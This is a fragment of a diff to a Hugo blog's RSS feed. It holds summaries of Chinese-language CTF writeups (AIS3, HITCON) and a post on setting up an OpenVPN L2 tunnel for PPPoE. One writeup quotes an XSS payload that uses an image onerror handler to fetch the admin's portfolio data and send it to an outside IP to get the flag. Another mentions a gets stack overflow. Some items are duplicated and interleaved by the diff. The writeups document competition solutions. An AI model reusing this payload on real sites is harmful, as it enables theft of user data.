@@ -18,15 +18,14 @@ E-Portfolio baby 題目 解題 網頁進來是登入介面 About 那邊可以放
 &amp;lt;h5&amp;gt;Hello!&amp;lt;/h5&amp;gt; I am a &amp;lt;span style=&amp;#34;color: red;&amp;#34;&amp;gt;new&amp;lt;/span&amp;gt; user. &amp;lt;img src=x onerror=&amp;#39;fetch(&amp;#34;/api/portfolio&amp;#34;).then(res =&amp;gt; res.json()).then(data =&amp;gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})&amp;#39;/&amp;gt; 送去給 admin 然後就收到 flag 了 Flag AIS3{&amp;lt;img src=x onerror='fetch(...}
 ManagementSystem 題目 解題 IDA 打開 人真好有給 shell code 每個 user 的 function 找一遍後發現 delete_user 有用 gets，可以 stack overflow，先讓他跑到 &amp;quot;Invalid index.</description></item><item><title>從 Wireshark 到 patch OpenVPN driver</title><link>https://hugo-profile.netlify.app/blogs/openvpn-patch/</link><pubDate>Sat, 08 Apr 2023 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/openvpn-patch/</guid><description>緣由 當初會這樣是因為接到一個很有趣的 case
 簡單來說就是想要 client 可以打 VPN 到另一邊，並且讓 PPPoE 可以透過 VPN 拿到中華電信的 public IP address。
-由於 PPPoE 是 L2 的協定，需要 ethernet header，因此 VPN 的選擇上就需要用 L2 Tunnel。關於甚麼是 L2 Tunnel 可以去看這篇文章與這篇文章。
-這邊我選擇用 OpenVPN tap 作為 L2 Tunnel。
-過程 於是乎我開始架設 VPN 架設的 config 可以參考這裡。
-架好的我開開心心的用 windows 測試
-到這邊我想說拿到 IP 了應該能動了，結果 ping 一下發現出不去。
-這就很奇怪了，於是乎我 ping 看看 ipv6 看看是不是一樣的問題，結果可以通。
-這下有趣了，V4 沒通 V6 有通，怎麼想都不正常，再加上我兩個都有拿到 IP。
-而作為一個遇到問題會死命 debug 的我直接就開始抓包測試。
-可以發現 ICMP ping 確實有封裝上 PPPoE header 並且從 VPN 網卡送出，且 VPN server 是有收到並轉發出去的，但是遲遲沒收到 response，因此可能是上游因為某些原因，可能不認可我們持有的 V4 IP 然後 drop 掉，但是認可 V6 的 IP。</description></item><item><title>HITCON CTF 2021 Writeup</title><link>https://hugo-profile.netlify.app/blogs/hitconctf-2022-writeup/</link><pubDate>Mon, 28 Nov 2022 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/hitconctf-2022-writeup/</guid><description>hitconctf-2022-writeup 戰績 checker Disassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a &amp;ldquo;hitcon&amp;rdquo; at address 0x140003000.
+至於他們原本的架構，也是很有趣，首先會找人重架的原因是因為他們說接 VPN 後網路很不穩定，speedtest 也無法測速的那種。
+於是我問了架構發現他們架構很酷。
+首先他們是用那種小電腦做 server，如下圖。
+而裡面長這樣。
+就是他小電腦裝 windows 10，裡面只有裝 VMware，然後開兩台 windows 的 VM，一台是 windows 7 做 VPN server，裡面用 softether vpn，另一台 windows 10 我不知道用途，他們說測試用。
+然後我就想這一台小電腦塞那麼多台 windows 不當才怪，再加上 softether vpn 沒架過並沒有很熟，也不確定這個效能好不好。
+於是我就推薦他們 host 機可以用 Proxmox VE 做虛擬化環境，然後 VPN 的部分由於 PPPoE 是 L2 的協定，需要 ethernet header，因此 VPN 的選擇上就需要用 L2 Tunnel。關於甚麼是 L2 Tunnel 可以去看這篇文章與這篇文章。
+這邊我選擇用 OpenVPN tap 作為 L2 Tunnel。</description></item><item><title>HITCON CTF 2021 Writeup</title><link>https://hugo-profile.netlify.app/blogs/hitconctf-2022-writeup/</link><pubDate>Mon, 28 Nov 2022 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/hitconctf-2022-writeup/</guid><description>hitconctf-2022-writeup 戰績 checker Disassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a &amp;ldquo;hitcon&amp;rdquo; at address 0x140003000.
 checker.exe:
 checker_drv.sys:
 Also, there are other codes that can be sent that will use the data from addresses 0x140003030 to 0x14000312F to change the function at address 0x14001B30, and then use that function to calculate the hex data from addresses 0x140003000 to 0x14000302A.</description></item><item><title>AIS3 Pre Exam 2022 Writeup</title><link>https://hugo-profile.netlify.app/blogs/ais3-pre-exam-2022-writeup/</link><pubDate>Tue, 17 May 2022 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/ais3-pre-exam-2022-writeup/</guid><description>Score Board Welcome Welcome 題目 Flag AIS3{WTF did I just see the FLAG before CTF starts?}
